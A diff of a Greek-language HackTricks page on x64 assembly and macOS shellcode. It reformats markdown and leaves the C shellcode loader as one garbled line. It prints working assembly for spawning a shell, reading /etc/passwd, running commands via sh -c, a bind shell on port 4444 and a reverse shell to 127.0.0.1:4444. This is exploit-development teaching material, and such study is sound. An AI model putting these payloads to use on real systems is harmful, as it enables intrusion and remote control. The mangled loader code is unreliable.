@@ -1,4 +1,4 @@
-# Εισαγωγή στο x64
+# Introduction to x64
 
 <details>
 
@@ -9,7 +9,7 @@
 * Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
@@ -39,11 +39,13 @@
 * **System V (συνήθως χρησιμοποιείται σε συστήματα UNIX-like)**: Οι πρώτες **έξι ακέραιες ή δείκτες παράμετροι** περνιούνται στους καταχωρητές **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** και **`r9`**. Η τιμή επιστροφής βρίσκεται επίσης στον καταχωρητή **`rax`**.
 
 Αν η συνάρτηση έχει περισσότερες από έξ
+
 ## macOS
 
 ### syscalls
 
 Υπάρχουν διάφορες κατηγορίες syscalls, μπορείτε να τις βρείτε [**εδώ**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -52,7 +54,9 @@
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
+
 Στη συνέχεια, μπορείτε να βρείτε τον αριθμό κάθε συστολής [**σε αυτήν τη διεύθυνση**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -69,6 +73,7 @@
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
+
 Έτσι για να καλέσετε την κλήση συστήματος `open` (**5**) από την κατηγορία **Unix/BSD**, πρέπει να προσθέσετε τον αριθμό `0x2000000`.
 
 Έτσι, ο αριθμός κλήσης συστήματος για να καλέσετε την `open` θα είναι `0x2000005`.
@@ -101,59 +106,42 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 <details>
 
 <summary>Κώδικας C για να δοκιμάσετε το shellcode</summary>
-```c
-// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
-// gcc loader.c -o loader
-#include <stdio.h>
-#include <sys/mman.h>
-#include <string.h>
-#include <stdlib.h>
 
-int (*sc)();
+\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include
 
-char shellcode[] = "<INSERT SHELLCODE HERE>";
+int (\*sc)();
 
-int main(int argc, char **argv) {
-printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+char shellcode\[] = "";
 
-void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-if (ptr == MAP_FAILED) {
-perror("mmap");
-exit(-1);
-}
-printf("[+] SUCCESS: mmap\n");
-printf("    |-> Return = %p\n", ptr);
+void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);
 
-void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
-printf("[+] SUCCESS: memcpy\n");
-printf("    |-> Return = %p\n", dst);
+if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);
 
-int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);
 
-if (status == -1) {
-perror("mprotect");
-exit(-1);
-}
-printf("[+] SUCCESS: mprotect\n");
-printf("    |-> Return = %d\n", status);
+int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);
 
-printf("[>] Trying to execute shellcode...\n");
+if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);
 
-sc = ptr;
-sc();
+printf("\[>] Trying to execute shellcode...\n");
 
-return 0;
-}
-```
+sc = ptr; sc();
+
+return 0; }
+
+````
 </details>
 
 #### Κέλυφος
 
 Παρμένο από [**εδώ**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) και εξηγείται.
 
-{% tabs %}
-{% tab title="με adr" %}
+<div data-gb-custom-block data-tag="tabs">
+
+<div data-gb-custom-block data-tag="tab" data-title='με adr'></div>
+
 ```armasm
 bits 64
 global _main
@@ -167,8 +155,8 @@ push    59                ; put 59 on the stack (execve syscall)
 pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
-```
-{% tab title="με τη χρήση της στοίβας" %}
+````
+
 ```armasm
 bits 64
 global _main
@@ -184,12 +172,11 @@ pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
 ```
-{% endtab %}
-{% endtabs %}
 
-#### Διάβασμα με την εντολή cat
+**Διάβασμα με την εντολή cat**
 
 Ο στόχος είναι να εκτελεστεί η εντολή `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, οπότε το δεύτερο όρισμα (x1) είναι ένας πίνακας παραμέτρων (που στη μνήμη αυτό σημαίνει ένα σωρό από διευθύνσεις).
+
 ```armasm
 bits 64
 section .text
@@ -220,7 +207,8 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### Εκτέλεση εντολής με το sh
+
+**Εκτέλεση εντολής με το sh**
 
 Για να εκτελέσετε μια εντολή χρησιμοποιώντας το `sh`, ακολουθήστε τα παρακάτω βήματα:
 
@@ -229,6 +217,7 @@ sh -c "εντολή"
 ```
 
 Αντικαταστήστε το `"εντολή"` με την εντολή που θέλετε να εκτελέσετε.
+
 ```armasm
 bits 64
 section .text
@@ -266,9 +255,11 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### Συνδεδεμένη κέλυφος (Bind shell)
+
+**Συνδεδεμένη κέλυφος (Bind shell)**
 
 Συνδεδεμένη κέλυφος από [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) στη **θύρα 4444**
+
 ```armasm
 section .text
 global _main
@@ -343,9 +334,11 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### Αντίστροφη Κέλυφος (Reverse Shell)
+
+**Αντίστροφη Κέλυφος (Reverse Shell)**
 
 Αντίστροφη κέλυφος από [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Αντίστροφη κέλυφος προς **127.0.0.1:4444**
+
 ```armasm
 section .text
 global _main
@@ -407,16 +400,7 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-<details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
